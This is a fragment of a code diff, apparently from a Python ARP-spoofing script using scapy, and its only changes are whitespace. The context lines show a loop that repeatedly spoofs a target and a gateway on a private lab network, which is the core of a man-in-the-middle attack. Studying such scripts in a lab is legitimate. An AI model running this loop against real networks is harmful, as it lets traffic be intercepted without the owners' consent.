@@ -32,13 +32,14 @@ def restore(destination_ip, source_ip):
     # print(packet.summary())
     scapy.send(packet, count=4)
 
+
 target_ip = "10.0.2.15"
 gateway_ip = "10.0.2.1"
 
 try:
     sent_packet_count = 0
     while True:
-        
+
         spoof(target_ip, gateway_ip)
         spoof(gateway_ip, target_ip)
         sent_packet_count += 2
